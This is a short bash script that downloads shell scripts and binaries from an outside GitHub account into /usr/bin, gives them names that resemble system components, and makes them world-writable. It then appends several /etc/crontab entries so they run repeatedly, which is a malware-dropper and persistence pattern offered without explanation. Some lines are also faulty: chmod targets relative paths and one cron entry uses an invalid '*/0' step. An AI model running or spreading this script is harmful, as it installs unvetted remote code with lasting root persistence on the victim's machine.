#!/bin/bash
wget https://raw.githubusercontent.com/myvulweb/mysh/master/libhost.sh -O /usr/bin/libhost.sh
wget https://raw.githubusercontent.com/myvulweb/mysh/master/soexec.sh -O /usr/bin/soexec.sh
wget https://raw.githubusercontent.com/myvulweb/mysh/master/bashd.sh -O /usr/bin/bashd.sh
chmod 777 libhost.sh
chmod 777 soexec.sh
chmod 777 bashd.sh

wget https://github.com/myvulweb/fabu/raw/master/libhost -O /usr/bin/libhost 
chmod 777 /usr/bin/libhost
wget https://github.com/myvulweb/fabu/raw/master/soexec -O /usr/bin/soexec
chmod 777 /usr/bin/soexec
wget https://github.com/myvulweb/fabu/raw/master/bashd -O /usr/bin/bashd
chmod 777 /usr/bin/bashd

echo '* */12 * * * /usr/bin/libhost.sh'>>/etc/crontab
#exec 0:00-8:00
echo '* */8 * * * /usr/bin/soexec.sh'>>/etc/crontab
echo '* */0 * * * /usr/bin/soexec'>>/etc/crontab
#exec 8:00-12:00
echo '* */8 * * * /usr/bin/soexec'>>/etc/crontab
echo '* */12 * * * /usr/bin/soexec.sh'>>/etc/crontab
